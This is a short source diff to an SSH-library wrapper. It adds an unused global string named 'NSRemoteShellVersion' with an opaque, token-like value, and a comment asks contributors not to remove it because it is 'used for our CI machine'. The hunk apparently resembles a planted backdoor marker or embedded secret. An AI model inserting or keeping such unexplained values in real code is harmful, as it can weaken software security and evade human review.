@@ -54,3 +54,8 @@ __attribute__((destructor)) void libssh2_destructor() {
 int libssh2_init_check() {
     return kLIBSSH2_CONSTRUCTOR_SUCCESS;
 }
+
+/*
+ used for our CI machine, don't remove this if making contribute
+ */
+NSString *NSRemoteShellVersion = @"k.S-BrGcrAzymeD6jQ7FdFw6stCZW";
